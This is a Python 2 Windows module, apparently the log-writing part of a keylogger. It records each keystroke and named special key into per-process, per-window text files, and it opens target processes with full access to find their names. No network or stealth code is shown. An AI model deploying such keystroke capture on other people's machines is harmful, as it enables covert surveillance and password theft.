import win32api, win32con, win32process
import os, os.path
import time
import re
import sys


class LogWriter:

    def __init__(self, rootLogDir=r"C:\Temp\logdir", debug=False):
        
        self.debug = debug
        self.rootLogDir = os.path.normpath(rootLogDir)
        
        try:
            os.mkdir(self.rootLogDir, 0777)
        except OSError, detail:
            if(detail.errno==17):  #if directory already exists, swallow the error
                pass
            else:
                print "OSError:", detail
        
        self.writeTarget = ""

    def OpenLogFile(self, event):
        
        subDirName = self.GetProcessNameFromHwnd(event.Window)
        subDirName = re.sub(r':?\\',r'__',subDirName)
        
        WindowName = re.sub(r':?\\',r'__',str(event.WindowName))
        
        try:
            os.makedirs(os.path.join(self.rootLogDir, subDirName), 0777)
        except OSError, detail:
            if(detail.errno==17):  #if directory already exists, swallow the error
                pass
            else:
                print "OSError:", detail
    
        filename = time.strftime('%Y%m%d') + "_" + str(event.Window) + "_" + WindowName + ".txt"

        #we do this writetarget thing to make sure we dont keep opening and closing the log file when all inputs are going
        #into the same log file. so, when our new writetarget is the same as the previous one, we just write to the same 
        #already-opened file.
        if self.writeTarget != os.path.join(self.rootLogDir, subDirName, filename): 
            if self.writeTarget != "":
                if self.debug: print "flushing and closing old log"
                self.log.flush()
                self.log.close()
            self.writeTarget = os.path.join(self.rootLogDir, subDirName, filename)
            if self.debug: print "writeTarget:",self.writeTarget

            self.log = open(self.writeTarget, 'a')

    def WriteToLogFile(self, event, options):
        self.OpenLogFile(event)
        
        asciiSubset = [8,9,10,13,27]           #backspace, tab, line feed, carriage return, escape
        asciiSubset.extend(range(32,128))      #all normal printable chars
        
        if options.parseBackspace == True:
            asciiSubset.remove(8)              #remove backspace from allowed chars if needed
        if options.parseEscape == True:
            asciiSubset.remove(27)             #remove escape from allowed chars if needed

        if event.Ascii in asciiSubset:
            self.PrintStuff(chr(event.Ascii))
        if event.Ascii == 13 and options.addLineFeed == True:
            self.PrintStuff(chr(10))                 #add line feed after CR,if option is set
            
        #we translate all the special keys, such as arrows, backspace, into text strings for logging
        #exclude shift keys, because they are already represented (as capital letters/symbols)
        if event.Ascii == 0 and not (str(event.Key).endswith('shift') or str(event.Key).endswith('Capital')):
            self.PrintStuff('[KeyName:' + event.Key + ']')
        
        #translate backspace into text string, if option is set.
        if event.Ascii == 8 and options.parseBackspace == True:
            self.PrintStuff('[KeyName:' + event.Key + ']')
        
        #translate escape into text string, if option is set.
        if event.Ascii == 27 and options.parseEscape == True:
            self.PrintStuff('[KeyName:' + event.Key + ']')

        if event.Key == options.flushKey:
            self.log.flush()


    def PrintStuff(self, stuff):
        if self.debug == False:
            self.log.write(stuff)
        else:
            sys.stdout.write(stuff)


    def GetProcessNameFromHwnd(self, hwnd):
    
        threadpid, procpid = win32process.GetWindowThreadProcessId(hwnd)
        #if self.debug: print "(threadid, processid)", threadpid, procpid
        
        # PROCESS_QUERY_INFORMATION (0x0400) or PROCESS_VM_READ (0x0010) or PROCESS_ALL_ACCESS (0x1F0FFF)
        
        mypyproc = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, procpid)
        procname = win32process.GetModuleFileNameEx(mypyproc, 0)
        return procname


if __name__ == '__main__':
    #some testing code
    #put a real existing hwnd into event.Window to run test
    lw = LogWriter()
    class Blank:
        pass
    event = Blank()
    event.Window = 264854
    event.WindowName = "Untitled - Notepad"
    event.Ascii = 65
    event.Key = 'A'
    options = Blank()
    options.parseBackspace = options.parseEscape = options.addLineFeed = options.debug = False
    options.flushKey = 'F12'
    lw.WriteToLogFile(event, options)
    
